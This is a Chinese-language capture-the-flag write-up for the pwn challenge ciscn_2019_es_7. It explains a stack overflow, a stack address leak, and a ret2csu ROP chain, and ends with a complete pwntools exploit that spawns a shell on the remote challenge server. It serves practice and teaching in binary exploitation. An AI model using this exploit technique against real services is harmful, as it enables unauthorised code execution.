checksec看到没有开Canary开了NX

![image-20210411105518736](https://static.hack1s.fun/images/2021/04/10/image-20210411105518736.png)

这个题目实际上和ciscn_2019_s_3是一样的，可以用ret2csu来做

或者也可以用SROP

IDA打开直接就是main调用vuln

vuln函数调用了一个read和一个write

![image-20210415154502847](https://static.hack1s.fun/images/2021/04/15/image-20210415154502847.png)

read这里有溢出

write输出的内容是0x30，如果read输少了也会输出栈上的内容

调试可以看到

![image-20210414094354914](https://static.hack1s.fun/images/2021/04/13/image-20210414094354914.png)

实际上输入的内容是0x10，之后就是rbp和return address了

但是实际上这个程序ret时栈顶是rbp而不是返回地址，在IDA里也可以看到这个 提示，堆栈不平衡

![image-20210415154502847](https://static.hack1s.fun/images/2021/04/15/image-20210415154502847.png)

再往下的内容是`environ`中的`argv[0]`

所以我们可以通过输出的字符串中的`0x20-0x28`这四个字节得到栈地址；

这个地址和buf之间的偏移是`0xdcf8-0xdbd0`即0x128

这个地方是个坑，在payload里面实际上不能把偏移当作0x128

因为这个函数堆栈不平衡，第二次运行到这里的时候更加低了0x10

所以是要减0x118



在调用`syscall`之前，需要将rax设置为系统调用号

64位中`read`是0，`write`是1，`execve`是0x3B，即59

题目给出了相关的gadget

![image-20210414101914507](https://static.hack1s.fun/images/2021/04/13/image-20210414101914507.png)

之后就是ret2csu的用法来修改前三个寄存器参数；

之后调用`execve("/bin/sh",0,0)`

最后的exp：

```python
from pwn import *

io = remote('node3.buuoj.cn',25624)
#  io = process('./ciscn_2019_es_7')                                                                                                                     
context.terminal=['konsole','sh','-e']
elf = ELF('./ciscn_2019_es_7')
main = elf.sym['vuln']
payload = b'/bin/sh\x00'*2 + p64(main)
io.send(payload)
io.recv(0x20)
buf_addr = u64(io.recv(8)) - 0x118
mov_eax3b = 0x4004e2
csu_pop = 0x40059a
csu_mov = 0x400580
pop_rdi = 0x4005a3
syscall_addr = 0x400501

payload = b"/bin/sh\x00"*2 + p64(mov_eax3b) + p64(csu_pop) + p64(0) + p64(0) + p64(buf_addr + 0x58) + p64(0) + p64(0) + p64(0) + p64(csu_mov) + p64(pop_rdi) + p64(buf_addr) + p64(syscall_addr)
#                            return address                  rbx      rbp      r12->csu_mov                    r13/rdx  r14/rsi  r15/rdi
io.send(payload)
io.interactive()
```

